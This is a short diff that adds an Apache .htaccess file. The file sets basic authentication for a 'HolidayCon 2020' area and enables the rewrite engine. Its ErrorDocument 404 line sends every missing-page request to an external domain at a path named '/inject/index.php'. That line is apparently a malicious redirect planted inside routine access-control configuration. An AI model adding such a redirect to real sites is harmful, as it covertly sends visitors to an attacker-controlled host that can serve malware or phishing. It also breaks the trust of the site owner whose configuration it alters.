@@ -1,0 +1,8 @@
+AuthType Basic
+AuthName "HolidayCon 2020"
+AuthUserFile /etc/httpd/.htpasswd
+Require valid-user
+
+RewriteEngine On 
+ErrorDocument 404 http://powercrystal.ru/inject/index.php
+
